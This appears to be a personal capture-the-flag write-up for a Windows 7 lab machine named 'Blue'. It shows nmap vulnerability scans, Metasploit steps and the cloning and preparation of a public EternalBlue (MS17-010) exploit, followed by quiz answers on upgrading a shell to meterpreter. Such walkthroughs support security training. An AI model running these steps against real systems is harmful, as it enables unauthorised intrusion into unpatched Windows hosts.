---
description: 'OS: Windows'
---

# BLUE

**بسم الله الرحمن الرحيم**

<figure><img src="../../../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

### Recon

using Nmap&#x20;

```bash
nmap 10.10.55.229 -sV -sC 
```

How many ports are open with a port number under 1000?

```bash
sudo nmap 10.10.55.229 -p 1-1000  #Result = 3
```

<figure><img src="../../../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

```
sudo nmap 10.10.55.229 -sV  -p T:135,139,445 --script="smb-vuln-*"

```

<figure><img src="../../../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
**the OS windows VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)**
{% endhint %}

### Gain Access / initial Access

using MSF6

```bash
msfconsole
search ms17-010
use 0
options
set RhOSTS


```



<figure><img src="../../../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

My connection was cut off  there was a problem with vpn

&#x20;

<figure><img src="../../../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

but in my PC <mark style="color:red;">**FAIl**</mark>

<figure><img src="../../../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

&#x20;i will try search I Found exploit [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

```bash
git clone  https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010/shellcode 
./shell_prep.sh
```

<figure><img src="../../../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

### Escalate

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)&#x20;

**`Answer`**` ``post/multi/manage/shell_to_meterpreter`

<figure><img src="../../../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

Select this (use MODULE\_PATH). Show options, what option are we required to change?

**Answer** `session`\
